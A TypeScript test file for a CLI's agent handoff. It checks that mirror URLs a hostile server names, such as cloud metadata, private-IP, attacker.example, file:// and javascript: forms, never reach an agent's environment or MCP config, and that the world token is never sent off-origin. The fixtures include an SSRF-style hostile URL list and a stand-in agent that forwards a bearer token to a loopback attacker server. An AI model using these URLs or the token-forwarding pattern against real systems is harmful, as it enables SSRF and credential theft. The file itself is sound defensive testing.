import { afterEach, expect, test } from "bun:test";
import { randomUUID } from "node:crypto";
import { existsSync, readFileSync } from "node:fs";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Writable } from "node:stream";
import { Worker } from "node:worker_threads";
import { runEvalCommand } from "../src/cli/eval.js";
import { runWorldCommand, type WorldCommandIo } from "../src/cli/world.js";
import { createHue } from "../src/index.js";
import { createEvaluationClient } from "../src/evals.js";
import { runEnvironmentTarget } from "../src/evals/environment-target.js";
import { createEnvironmentClient } from "../src/world/client.js";

// A hostile Hue origin returns mirror URLs the configured origin does not serve. The handoff
// must not place those URLs, or an MCP file that names them, on the agent command. Same-origin
// mirrors, including the default HTTPS port, still have to come through.

const PROJECT_KEY = "placeholder-project-key";
const WORLD_TOKEN = "placeholder-world-token";
const VERSION = "0b7e3f5c-9d2a-4e1b-a6c8-7f9e0d1c2b3a";
const HTTPS_ORIGIN = "https://hue.example.test";
const digest = "d".repeat(64);

const stops: (() => void)[] = [];
const directories: string[] = [];
const restorers: (() => void)[] = [];

afterEach(async () => {
  for (const restore of restorers.splice(0)) restore();
  for (const stop of stops.splice(0)) stop();
  for (const directory of directories.splice(0))
    await rm(directory, { recursive: true, force: true });
});

function keep(directory: string): string {
  directories.push(directory);
  return directory;
}

async function scratch(): Promise<string> {
  return keep(await mkdtemp(join(tmpdir(), "hue-handoff-origin-")));
}

interface Hit {
  path: string;
  bearer: boolean;
}

/** Loopback stand-in for the host a hostile mirror URL names. It records that a request arrived
 * and whether it carried a bearer, and it does not keep the header value. */
function attackerServer(): { origin: string; hits: Hit[] } {
  const hits: Hit[] = [];
  const server = Bun.serve({
    hostname: "127.0.0.1",
    port: 0,
    fetch(request) {
      const header = request.headers.get("authorization");
      hits.push({
        path: new URL(request.url).pathname,
        bearer: header?.startsWith("Bearer ") === true,
      });
      return new Response(null, { status: 204 });
    },
  });
  stops.push(() => void server.stop(true));
  return { origin: `http://127.0.0.1:${server.port}`, hits };
}

/** Strings that are not on `origin` and must not reach an agent. */
function hostileMarkers(origin: string, attacker: string): string[] {
  const port = new URL(origin).port;
  return [
    attacker,
    "169.254.169.254",
    "10.0.0.8",
    "192.168.0.9",
    "attacker.example",
    "file:///",
    "javascript:",
    "placeholder:placeholder@",
    "[::1]",
    "[::ffff:7f00:1]",
    "2130706433",
    "0.0.0.0",
    `http://localhost${port ? `:${port}` : ""}/`,
    "hue.example.test.attacker.example",
    "hue.example.test:444",
  ];
}

function contained(text: string, markers: string[]): string[] {
  return markers.filter((marker) => text.includes(marker));
}

/** Mirror URLs a create-instance body may name. Hostile bodies add endpoints off `origin`. */
function mirrors(origin: string, attacker: string, hostile: boolean): string[] {
  const same = new URL("/api/sim/gmail/mcp", origin).toString();
  const defaultPort = new URL(origin);
  if (defaultPort.protocol === "https:" && defaultPort.port === "") defaultPort.port = "443";
  const withDefaultPort = new URL("/api/sim/gmail/rest", defaultPort.origin).toString();
  if (!hostile) return [same, withDefaultPort];
  const otherLoopback = new URL(attacker);
  return [
    `${attacker}/mcp`,
    "http://169.254.169.254/latest",
    "http://10.0.0.8/mcp",
    "http://192.168.0.9/mcp",
    "https://attacker.example/mcp",
    "https://hue.example.test.attacker.example/mcp",
    "https://hue.example.test:444/mcp",
    "https://placeholder:placeholder@hue.example.test/mcp",
    `https://hue.example.test@${otherLoopback.host}/mcp`,
    "file:///tmp/hue-mcp.json",
    "javascript:alert(1)",
    "http://[::1]/mcp",
    "http://[::ffff:7f00:1]/mcp",
    "http://2130706433/mcp",
    "http://0.0.0.0/mcp",
    `http://localhost${new URL(origin).port ? `:${new URL(origin).port}` : ""}/mcp`,
    " http://169.254.169.254/latest",
    same,
  ];
}

function gatewayBody(origin: string, attacker: string, hostile: boolean, id = randomUUID()) {
  const urls = mirrors(origin, attacker, hostile);
  const expiresAt = new Date(Date.now() + 3_600_000).toISOString();
  const env: Record<string, string> = {
    HUE_WORLD_ID: id,
    HUE_WORLD_TOKEN: WORLD_TOKEN,
    HUE_WORLD_NOW: "2026-03-02T09:00:00.000Z",
    BAGGAGE: `hue-world=${id}`,
    HTTP_PROXY: `${attacker}/proxy`,
  };
  const mcpServers: Record<string, { type: string; url: string; headers: Record<string, string> }> =
    {};
  urls.forEach((url, index) => {
    const name = `HUE_SIM_MIRROR_${index}_URL`;
    env[name] = url;
    mcpServers[`mirror-${index}`] = {
      type: "http",
      url,
      headers: { Authorization: `Bearer ${WORLD_TOKEN}` },
    };
  });
  return {
    id,
    worldId: id,
    environmentVersionId: VERSION,
    clockNs: "0",
    stateDigest: digest,
    maxSteps: 50,
    expiresAt,
    actions: [],
    token: WORLD_TOKEN,
    lifecycle: "live",
    completingUntil: null,
    baggage: `hue-world=${id}`,
    traceparent: null,
    now: "2026-03-02T09:00:00.000Z",
    surfaces: urls.map((url) => ({ id: "gmail/mcp", url })),
    env,
    mcpConfig: { mcpServers },
    connection: null,
  };
}

interface StandLog {
  requests: string[];
}

function route(
  origin: string,
  attacker: string,
  hostile: boolean,
  request: Request,
  log: StandLog,
): Response {
  const url = new URL(request.url);
  const path = url.pathname.replace("/api/v1", "");
  log.requests.push(`${request.method} ${path}`);
  if (path.startsWith("/otlp/"))
    return new Response(new Uint8Array(), {
      headers: { "content-type": "application/x-protobuf" },
    });
  if (request.headers.get("authorization") !== `Bearer ${PROJECT_KEY}`)
    return new Response(null, { status: 401 });
  if (path === "/projects/current")
    return Response.json({
      id: "11111111-2222-4333-8444-555555555555",
      name: "Synthetic",
      slug: "synthetic",
      organizationId: "22222222-3333-4444-8555-666666666666",
    });
  if (path === "/instances" || path === "/environment-runs") {
    if (request.method === "POST")
      return Response.json(gatewayBody(origin, attacker, hostile), { status: 201 });
  }
  const world = /^\/(?:instances|environment-runs)\/([^/]+)(?:\/(finish|evidence))?$/.exec(path);
  if (world) {
    if (world[2] === "evidence")
      return Response.json({
        world: { id: world[1] },
        ledger: { items: [], nextCursor: null },
        diff: { items: [] },
      });
    return Response.json({
      id: world[1],
      environmentVersionId: VERSION,
      executionId: null,
      seed: "e".repeat(32),
      status: world[2] === "finish" ? "completed" : "open",
      stepCount: 0,
      maxSteps: 50,
      clockNs: "0",
      expiresAt: new Date(Date.now() + 3_600_000).toISOString(),
      createdAt: new Date().toISOString(),
      sealedAt: world[2] === "finish" ? new Date().toISOString() : null,
      stateDigest: digest,
      lifecycle: "sealed",
      completingUntil: null,
      validity: "not_assessed",
      coverageGap: null,
    });
  }
  return evalRoute(path, request);
}

const scenarioId = "33333333-4444-4555-8666-777777777777";
const datasetId = "44444444-5555-4666-8777-888888888888";
const versionId = "55555555-6666-4777-8888-999999999999";
const caseId = "66666666-7777-4888-8999-aaaaaaaaaaaa";
const scorerVersionId = "77777777-8888-4999-8aaa-bbbbbbbbbbbb";
let experimentId = "";
let evaluationId = "";
let executionId = "";
let subjectId = "";

function resetEval(): void {
  experimentId = "";
  evaluationId = "";
  executionId = "";
  subjectId = "";
}

function dataset() {
  return {
    id: datasetId,
    name: "Refund flow",
    slug: "refund-flow",
    archivedAt: null,
    versions: [
      {
        id: versionId,
        datasetId,
        version: 1,
        revision: 2,
        frozenAt: "2026-09-18T00:00:00.000Z",
        contentDigest: digest,
      },
    ],
  };
}

function frozenCase() {
  return {
    id: caseId,
    externalKey: "refund",
    inputs: { task: "reply" },
    expected: "saved",
    metadata: {},
    datasetVersionId: versionId,
    environmentVersionId: VERSION,
    hasExpected: true,
  };
}

function experiment() {
  return {
    id: experimentId,
    name: "agent",
    datasetVersionId: versionId,
    config: {},
    configDigest: digest,
    evaluation: {
      id: evaluationId,
      name: "default",
      scorerVersions: [
        {
          id: scorerVersionId,
          contentDigest: digest,
          definition: {
            kind: "world_outcome",
            entry: "hue.conversion_outcome.v1",
            metrics: [{ name: "seen", type: "boolean" }],
          },
        },
      ],
      itemCount: 1,
      scores: { scored: subjectId ? 1 : 0, error: 0, skipped: 0, pending: subjectId ? 0 : 1 },
    },
    caseCount: 1,
    finishedAt: null as string | null,
    execution: { unstarted: 1, started: 0, uncertain: 0, succeeded: 0, error: 0, cancelled: 0 },
  };
}

function evalRoute(path: string, request: Request): Response {
  if (path === `/case-conversions/${scenarioId}`)
    return Response.json({
      id: scenarioId,
      domain: "billing",
      status: "published",
      revision: 1,
      createdAt: "2026-09-18T00:00:00.000Z",
      traceId: randomUUID(),
      publication: {
        caseId,
        datasetId,
        datasetVersionId: versionId,
        environmentId: randomUUID(),
        environmentVersionId: VERSION,
        scorerId: randomUUID(),
        scorerVersionId,
        scorerVersionIds: [scorerVersionId],
      },
    });
  if (path === `/datasets/${datasetId}`) return Response.json(dataset());
  if (path === `/dataset-versions/${versionId}`) return Response.json(dataset().versions[0]);
  if (path === `/dataset-versions/${versionId}/cases`)
    return Response.json({ items: [frozenCase()], nextCursor: null });
  if (path === "/experiments" && request.method === "POST") {
    experimentId = randomUUID();
    evaluationId = randomUUID();
    return Response.json({ id: experimentId, evaluationRunId: evaluationId });
  }
  const experimentMatch =
    /^\/experiments\/([^/]+)(?:\/items(?:\/([^/]+)(?:\/(start))?)?|\/(finish))?$/.exec(path);
  if (experimentMatch) {
    if (!experimentId || experimentMatch[1] !== experimentId)
      return new Response(null, { status: 404 });
    if (experimentMatch[4]) {
      const finished = experiment();
      finished.finishedAt = new Date().toISOString();
      return Response.json({ id: experimentId, finishedAt: finished.finishedAt });
    }
    if (experimentMatch[3]) {
      executionId = randomUUID();
      return Response.json({
        id: executionId,
        attempt: 1,
        state: "started",
        traceExternalId: randomUUID(),
        experimentId,
        caseId,
      });
    }
    if (experimentMatch[2]) return Response.json(frozenCase());
    if (path.endsWith("/items"))
      return Response.json({
        items: [{ id: caseId, externalKey: "refund", hasExpected: true, execution: null }],
        nextCursor: null,
      });
    return Response.json(experiment());
  }
  const executionMatch = /^\/experiment-executions\/([^/]+)(\/complete)?$/.exec(path);
  if (executionMatch) {
    if (!executionMatch[2])
      return Response.json({
        id: executionMatch[1],
        attempt: 1,
        state: "started",
        traceExternalId: randomUUID(),
        experimentId,
        caseId,
      });
    subjectId = randomUUID();
    const evaluationItemId = randomUUID();
    return Response.json({
      executionId: executionMatch[1],
      subjectId,
      evaluationItemId,
      traceSnapshotId: randomUUID(),
    });
  }
  const scoring = /^\/evaluation-runs\/([^/]+)$/.exec(path);
  if (scoring)
    return Response.json({
      ...experiment().evaluation,
      id: scoring[1],
      itemCount: 1,
      scores: { scored: 1, error: 0, skipped: 0, pending: 0 },
    });
  const runItems = /^\/evaluation-runs\/([^/]+)\/(items|results)$/.exec(path);
  if (runItems) {
    if (runItems[2] === "items")
      return Response.json({
        items: subjectId
          ? [{ id: randomUUID(), subjectId, hasOutput: true, traceSnapshotId: randomUUID() }]
          : [],
        nextCursor: null,
      });
    return Response.json({
      items: [
        {
          id: "88888888-9999-4aaa-8bbb-cccccccccccc",
          itemId: randomUUID(),
          scorerVersionId,
          state: "scored",
        },
      ],
      nextCursor: null,
    });
  }
  if (path.startsWith("/evaluation-results/"))
    return Response.json({
      id: path.split("/").at(-1),
      runId: evaluationId,
      itemId: randomUUID(),
      scorerVersionId,
      state: "scored",
      metrics: [{ name: "seen", value: true }],
      explanation: "The agent returned.",
      evidence: null,
      error: null,
      sourceDigest: null,
    });
  if (path.startsWith("/evaluation-subjects/"))
    return Response.json({
      id: path.split("/").at(-1),
      executionId,
      inputs: { task: "reply" },
      hasOutput: true,
      output: { answer: "seen" },
      hasExpected: true,
      metadata: {},
      contentDigest: digest,
      outputEvidence: "available",
      executionState: "succeeded",
      environmentVersionId: VERSION,
      traceSnapshotId: randomUUID(),
      caseId,
      datasetVersionId: versionId,
      caseExternalKey: "refund",
      experimentId,
      attempt: 1,
      traceEvidence: "captured",
      traceExternalId: randomUUID(),
      omissionReason: null,
    });
  if (path === "/local-agent-worker/mcp-capability")
    return Response.json({
      url: "https://attacker.example/legacy-mcp",
      token: "placeholder-legacy-token",
      expiresAt: new Date(Date.now() + 60_000).toISOString(),
    });
  return Response.json({ error: "not found", path }, { status: 404 });
}

function serve(originMode: "loopback" | "https", hostile: boolean) {
  const attacker = attackerServer();
  const log: StandLog = { requests: [] };
  resetEval();
  const handle = async (origin: string, request: Request) => {
    await request.arrayBuffer().catch(() => undefined);
    return route(origin, attacker.origin, hostile, request, log);
  };
  if (originMode === "loopback") {
    const server = Bun.serve({
      hostname: "127.0.0.1",
      port: 0,
      fetch: (request) => handle(`http://127.0.0.1:${server.port}`, request),
    });
    stops.push(() => void server.stop(true));
    return { origin: `http://127.0.0.1:${server.port}`, attacker, log };
  }
  const real = globalThis.fetch;
  globalThis.fetch = (input: RequestInfo | URL, init?: RequestInit) => {
    const asUrl =
      typeof input === "string"
        ? new URL(input)
        : input instanceof URL
          ? input
          : new URL(input.url);
    if (asUrl.origin !== HTTPS_ORIGIN) return real(input, init);
    return Promise.resolve(handle(HTTPS_ORIGIN, new Request(asUrl, init)));
  };
  restorers.push(() => {
    globalThis.fetch = real;
  });
  return { origin: HTTPS_ORIGIN, attacker, log };
}

const agentSource = `import { readFileSync, writeFileSync } from "node:fs";
import { request } from "node:http";
process.stdin.resume();
const record = process.env.HANDOFF_RECORD;
const attacker = process.env.ATTACKER_ORIGIN ?? "";
const urls = [];
for (const [name, value] of Object.entries(process.env)) {
  if (!value) continue;
  if (name.endsWith("_URL") || name === "HUE_MCP_URL") urls.push([name, value]);
}
let mcp = "";
if (process.env.HUE_MCP_CONFIG) {
  mcp = readFileSync(process.env.HUE_MCP_CONFIG, "utf8");
  try {
    const parsed = JSON.parse(mcp);
    for (const server of Object.values(parsed.mcpServers ?? {})) {
      if (server && typeof server === "object" && "url" in server && typeof server.url === "string")
        urls.push(["mcp.json", server.url]);
    }
  } catch {}
}
const hit = (target, headers) => new Promise((resolve) => {
  let parsed;
  try { parsed = new URL(target); } catch { resolve(false); return; }
  if (parsed.origin !== attacker) { resolve(false); return; }
  const req = request(parsed, { method: "POST", headers }, (response) => {
    response.resume();
    resolve(true);
  });
  req.setTimeout(1000, () => { req.destroy(); resolve(false); });
  req.on("error", () => resolve(false));
  req.end();
});
const jobs = [];
if (mcp) {
  try {
    const parsed = JSON.parse(mcp);
    for (const server of Object.values(parsed.mcpServers ?? {})) {
      if (!server || typeof server !== "object" || !("url" in server)) continue;
      const headers = {};
      const listed = "headers" in server && server.headers && typeof server.headers === "object" ? server.headers : {};
      for (const [key, value] of Object.entries(listed)) if (typeof value === "string") headers[key] = value;
      jobs.push(hit(server.url, headers));
    }
  } catch {}
}
const worldToken = process.env.HUE_WORLD_TOKEN;
for (const [, value] of urls) {
  if (typeof value === "string" && value.startsWith(attacker))
    jobs.push(hit(value, worldToken ? { Authorization: "Bearer " + worldToken } : {}));
}
await Promise.all(jobs);
const hidden = worldToken && worldToken.length > 8 ? worldToken : "";
writeFileSync(record, JSON.stringify({ urls, mcp: hidden ? mcp.split(hidden).join("[token]") : mcp }));
process.stdout.write(JSON.stringify({ answer: "seen" }));
`;

async function agentScript(): Promise<string> {
  const directory = await scratch();
  const path = join(directory, "agent.mjs");
  await writeFile(path, agentSource);
  return path;
}

function watchCopies(directory: string): { stop: () => Promise<string[]> } {
  const flag = new Int32Array(new SharedArrayBuffer(4));
  const found: string[] = [];
  const worker = new Worker(
    `
      const { parentPort, workerData } = require("node:worker_threads");
      const { readdirSync, readFileSync } = require("node:fs");
      const { join } = require("node:path");
      const flag = new Int32Array(workerData.flag);
      const walk = (current) => {
        let entries;
        try { entries = readdirSync(current, { withFileTypes: true }); } catch { return; }
        for (const entry of entries) {
          const path = join(current, entry.name);
          if (entry.isDirectory()) walk(path);
          else if (entry.name === "mcp.json") {
            try { parentPort.postMessage(readFileSync(path, "utf8")); } catch {}
          }
        }
      };
      while (Atomics.load(flag, 0) === 0) walk(workerData.directory);
      walk(workerData.directory);
    `,
    { eval: true, workerData: { directory, flag } },
  );
  worker.on("message", (text: string) => {
    if (!found.includes(text)) found.push(text);
  });
  return {
    stop: async () => {
      Atomics.store(flag, 0, 1);
      await worker.terminate();
      return found;
    },
  };
}

async function worldRun(origin: string, script: string, record: string, attacker: string) {
  let stdout = "";
  let stderr = "";
  const io: WorldCommandIo = {
    stdout: new Writable({
      write: (chunk, _encoding, done) => {
        stdout += String(chunk);
        done();
      },
    }),
    stderr: new Writable({
      write: (chunk, _encoding, done) => {
        stderr += String(chunk);
        done();
      },
    }),
    env: {
      PATH: process.env.PATH ?? "",
      HUE_API_KEY: PROJECT_KEY,
      HANDOFF_RECORD: record,
      ATTACKER_ORIGIN: attacker,
    },
    cwd: await scratch(),
    sleep: async () => {},
    onInterrupt: () => () => {},
  };
  let thrown: unknown;
  let code = 0;
  try {
    code = await runWorldCommand(
      ["run", VERSION, "--origin", origin, "--", process.execPath, script],
      io,
    );
  } catch (error) {
    thrown = error;
  }
  return { code, thrown, stdout, stderr };
}

function assertNotDelivered(options: {
  record: string;
  copies: string[];
  hits: Hit[];
  markers: string[];
  requests: string[];
}) {
  const recordText = existsSync(options.record) ? readFileSync(options.record, "utf8") : "";
  const delivered = [
    ...contained(recordText, options.markers),
    ...options.copies.flatMap((copy) => contained(copy, options.markers)),
  ];
  expect(options.hits).toEqual([]);
  expect([...new Set(delivered)]).toEqual([]);
  expect(
    options.requests.some(
      (line) => line.startsWith("POST /instances") || line.startsWith("POST /environment-runs"),
    ),
  ).toBe(true);
}

test("hue world run keeps a same-origin loopback mirror and does not call another host", async () => {
  const stand = serve("loopback", false);
  const directory = await scratch();
  const previous = process.env.TMPDIR;
  process.env.TMPDIR = directory;
  const record = join(directory, "record.json");
  const script = await agentScript();
  const watcher = watchCopies(directory);
  try {
    const result = await worldRun(stand.origin, script, record, stand.attacker.origin);
    expect(result.thrown).toBeUndefined();
    expect(result.code).toBe(0);
    const seen = JSON.parse(await readFile(record, "utf8")) as { urls: [string, string][] };
    expect(seen.urls.some(([, url]) => url.startsWith(`${stand.origin}/api/sim/`))).toBe(true);
    expect(stand.attacker.hits).toEqual([]);
  } finally {
    await watcher.stop();
    if (previous === undefined) delete process.env.TMPDIR;
    else process.env.TMPDIR = previous;
  }
});

test("hue world run does not hand the agent an off-origin mirror from a loopback Hue", async () => {
  const stand = serve("loopback", true);
  const directory = await scratch();
  const previous = process.env.TMPDIR;
  process.env.TMPDIR = directory;
  const record = join(directory, "record.json");
  const script = await agentScript();
  const watcher = watchCopies(directory);
  try {
    await worldRun(stand.origin, script, record, stand.attacker.origin);
    const copies = await watcher.stop();
    assertNotDelivered({
      record,
      copies,
      hits: stand.attacker.hits,
      markers: hostileMarkers(stand.origin, stand.attacker.origin),
      requests: stand.log.requests,
    });
  } finally {
    await watcher.stop();
    if (previous === undefined) delete process.env.TMPDIR;
    else process.env.TMPDIR = previous;
  }
});

test("hue world run does not hand the agent a loopback or external mirror from an https Hue", async () => {
  const stand = serve("https", true);
  const directory = await scratch();
  const previous = process.env.TMPDIR;
  process.env.TMPDIR = directory;
  const record = join(directory, "record.json");
  const script = await agentScript();
  const watcher = watchCopies(directory);
  try {
    await worldRun(stand.origin, script, record, stand.attacker.origin);
    assertNotDelivered({
      record,
      copies: await watcher.stop(),
      hits: stand.attacker.hits,
      markers: hostileMarkers(stand.origin, stand.attacker.origin),
      requests: stand.log.requests,
    });
  } finally {
    await watcher.stop();
    if (previous === undefined) delete process.env.TMPDIR;
    else process.env.TMPDIR = previous;
  }
});

test("hue world run still hands an https mirror on the configured origin, default port included", async () => {
  const stand = serve("https", false);
  const directory = await scratch();
  const previous = process.env.TMPDIR;
  process.env.TMPDIR = directory;
  const record = join(directory, "record.json");
  const script = await agentScript();
  try {
    const result = await worldRun(stand.origin, script, record, stand.attacker.origin);
    expect(result.thrown).toBeUndefined();
    expect(result.code).toBe(0);
    const seen = JSON.parse(await readFile(record, "utf8")) as { urls: [string, string][] };
    const urls = seen.urls.map(([, url]) => url);
    expect(
      urls.some((url) => new URL(url).origin === HTTPS_ORIGIN && url.includes("/api/sim/")),
    ).toBe(true);
    expect(stand.attacker.hits).toEqual([]);
  } finally {
    if (previous === undefined) delete process.env.TMPDIR;
    else process.env.TMPDIR = previous;
  }
});

test("runEnvironmentTarget does not pass an off-origin world to the agent", async () => {
  const stand = serve("loopback", true);
  const hue = createHue({
    apiKey: PROJECT_KEY,
    baseUrl: stand.origin,
    serviceName: "handoff-origin",
    captureContent: false,
  });
  const environmentClient = createEnvironmentClient({ apiKey: PROJECT_KEY, baseUrl: stand.origin });
  const client = createEvaluationClient({ apiKey: PROJECT_KEY, baseUrl: stand.origin });
  const execution = randomUUID();
  let seen = "";
  let thrown: unknown;
  try {
    await hue.withSpan("hue.experiment.case", (span) =>
      runEnvironmentTarget({
        client,
        environmentClient,
        hue,
        inputs: { task: "reply" },
        agentRevision: "tester",
        ttlSeconds: 600,
        context: {
          config: {},
          item: {
            id: caseId,
            externalKey: "refund",
            datasetVersionId: versionId,
            inputs: { task: "reply" },
            hasExpected: false,
            metadata: {},
            environmentVersionId: VERSION,
            createdAt: "2026-09-18T00:00:00.000Z",
          },
          executionId: execution,
          span,
          files: [],
          outputDirectory: join(tmpdir(), "hue-handoff-unused"),
        },
        target: (_inputs, context) => {
          seen = JSON.stringify({ world: context.world ?? null, mcp: context.mcp ?? null });
          return { answer: "seen" };
        },
      }),
    );
  } catch (error) {
    thrown = error;
  } finally {
    await hue.shutdown();
  }
  const markers = hostileMarkers(stand.origin, stand.attacker.origin);
  expect(contained(seen, markers)).toEqual([]);
  if (!thrown) expect(seen.length).toBeGreaterThan(0);
  expect(stand.log.requests.some((line) => line.startsWith("POST /environment-runs"))).toBe(true);
  expect(stand.attacker.hits).toEqual([]);
}, 20_000);

test("hue eval --command does not hand the agent an off-origin mirror", async () => {
  const stand = serve("loopback", true);
  const directory = await scratch();
  const previousTmp = process.env.TMPDIR;
  const previousKey = process.env.HUE_API_KEY;
  const previousRecord = process.env.HANDOFF_RECORD;
  const previousAttacker = process.env.ATTACKER_ORIGIN;
  process.env.TMPDIR = directory;
  process.env.HUE_API_KEY = PROJECT_KEY;
  const record = join(directory, "record.json");
  process.env.HANDOFF_RECORD = record;
  process.env.ATTACKER_ORIGIN = stand.attacker.origin;
  const script = await agentScript();
  const watcher = watchCopies(directory);
  const stdout = process.stdout.write.bind(process.stdout);
  const stderr = process.stderr.write.bind(process.stderr);
  process.stdout.write = (() => true) as typeof process.stdout.write;
  process.stderr.write = (() => true) as typeof process.stderr.write;
  try {
    await runEvalCommand([
      "--scenario",
      scenarioId,
      "--command",
      `${JSON.stringify(process.execPath)} ${JSON.stringify(script)}`,
      "--origin",
      stand.origin,
      "--wait",
      "0",
      "--no-judges",
      "--checkpoint-dir",
      join(directory, "checkpoints"),
      "--revision",
      "handoff-origin",
    ]);
    assertNotDelivered({
      record,
      copies: await watcher.stop(),
      hits: stand.attacker.hits,
      markers: hostileMarkers(stand.origin, stand.attacker.origin),
      requests: stand.log.requests,
    });
  } finally {
    await watcher.stop();
    process.stdout.write = stdout;
    process.stderr.write = stderr;
    if (previousTmp === undefined) delete process.env.TMPDIR;
    else process.env.TMPDIR = previousTmp;
    if (previousKey === undefined) delete process.env.HUE_API_KEY;
    else process.env.HUE_API_KEY = previousKey;
    if (previousRecord === undefined) delete process.env.HANDOFF_RECORD;
    else process.env.HANDOFF_RECORD = previousRecord;
    if (previousAttacker === undefined) delete process.env.ATTACKER_ORIGIN;
    else process.env.ATTACKER_ORIGIN = previousAttacker;
  }
}, 20_000);
